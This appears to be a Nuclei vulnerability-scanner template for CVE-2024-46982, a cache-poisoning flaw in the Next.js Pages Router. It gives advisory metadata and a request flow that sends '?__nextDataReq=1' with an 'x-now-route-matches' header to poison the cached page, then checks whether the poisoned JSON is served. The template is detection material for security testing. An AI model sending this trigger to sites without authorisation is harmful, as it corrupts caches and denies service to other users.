id: CVE-2024-46982

info:
  name: Next.js Pages Router <= 14.2.9 - Cache Poisoning of Non-Dynamic SSR Routes
  author: hnd3884
  severity: high
  description: |
    Next.js versions between 13.5.1 and 14.2.9 (inclusive) are vulnerable to cache poisoning of non-dynamic server-side rendered routes in the Pages Router. By sending a crafted HTTP request, an attacker can force a non-dynamic SSR route (e.g. `pages/dashboard.tsx`, not dynamic routes like `pages/blog/[slug].tsx`) to be cached incorrectly, due to how Next.js handles caching of SSR routes. Vulnerable responses may include headers like `Cache-Control: s-maxage=1, stale-while-revalidate`, which some upstream CDNs may obey, resulting in the poisoned response being served to other users. This issue has been fixed in Next.js versions **13.5.7**, **14.2.10**, and later. We strongly recommend upgrading to a safe version.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46982
    - https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3
    - https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda
    - https://github.com/advisories/GHSA-gp8f-8m3g-qvj9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2024-46982
    cwe-id: CWE-639
    epss-score: 0.015
    cpe: cpe:2.3:a:vercel:next.js:*:*:*:*:*:node.js:*:*
  metadata:
    verified: true
    vendor: vercel
    product: next.js
    publicwww-query: "next.config.js"
  tags: cve,cve2024,nextjs,cache,poisoning,ssr,non-dynamic

flow: headless(1) && http(1) && headless(2) && headless(3)

headless:
  - steps: # Access original request
      - action: navigate
        args:
          url: "{{BaseURL}}"
      - action: waitload
  - steps: # Validate cache poisoning
      - action: navigate
        args:
          url: "{{BaseURL}}"
      - action: waitload
    matchers:
      - type: dsl
        dsl:
          - "md5(headless_2_data) != md5(headless_1_data)" # Compare with original request
          - 'starts_with(headless_2_data, "<html><head></head><body>{\"pageProps\":")' # Check if poisoned content start with '{"pageProps:'
        condition: and
    extractors:
      - type: regex
        part: body
        regex:
          - '(pageProps":{.+?})'
  - steps: # Wait for s-maxage to expire and revalidate
      - action: sleep
        args:
          duration: "{{s_maxage}}"
      - action: navigate
        args:
          url: "{{BaseURL}}"
      - action: waitload

http:
  - method: GET # Trigger cache poisoning
    path:
      - "{{BaseURL}}?__nextDataReq=1"
    headers:
      x-now-route-matches: "1"
      # x-NextJS-cache: "INVALIDATE"
    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "Cache-Control: s-maxage=[0-9]+?, stale-while-revalidate"
        internal: true
      - type: word
        part: header
        words:
          - "application/json" # Ensure response is JSON
        internal: true
      - type: dsl
        dsl:
          - 'starts_with(http_body, "{\"pageProps\":")' # Check if poisoned content start with '{"pageProps:'
        internal: true
    extractors:
      - type: regex
        part: header
        name: s_maxage
        regex:
          - "s-maxage=([0-9]+?)"
        group: 1
        internal: true
